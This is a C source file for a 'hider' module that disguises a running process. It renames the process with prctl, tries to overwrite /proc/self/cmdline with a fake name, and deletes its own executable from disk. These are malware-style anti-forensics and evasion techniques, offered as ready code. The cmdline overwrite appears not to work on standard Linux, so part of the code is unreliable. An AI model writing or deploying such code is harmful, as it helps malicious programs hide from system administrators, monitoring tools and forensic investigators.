#define _GNU_SOURCE
#include "hider.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>

int set_comm(const char *new_name) {
    if (!new_name) return -1;
    if (prctl(PR_SET_NAME, (unsigned long)new_name, 0, 0, 0) == 0) {
        printf("[hider] prctl(PR_SET_NAME) succeeded\n");
        return 0;
    } else {
        perror("[hider] prctl failed");
        return -1;
    }
}

int overwrite_cmdline(const char *new_name) {
    if (!new_name) return -1;

    int fd = open("/proc/self/cmdline", O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        size_t len = strlen(new_name);
        if (write(fd, new_name, len) != (ssize_t)len) {
            close(fd);
            return -1;
        }
        write(fd, "\0", 1); // NUL terminate
        close(fd);
        printf("[hider] /proc/self/cmdline overwritten\n");
        return 0;
    } else {
        perror("[hider] failed to open /proc/self/cmdline");
        return -1;
    }
}

int unlink_self() {
    char path[512];
    ssize_t n = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (n > 0) {
        path[n] = '\0';
        if (unlink(path) == 0) {
            printf("[hider] binary unlinked: %s\n", path);
            return 0;
        } else {
            perror("[hider] unlink failed");
            return -1;
        }
    }
    return -1;
}

int run_hider(const char *new_name) {
    int err = 0;
    if (set_comm(new_name) != 0) err = -1;
    if (overwrite_cmdline(new_name) != 0) err = -1;
    if (unlink_self() != 0) err = -1;
    return err;
}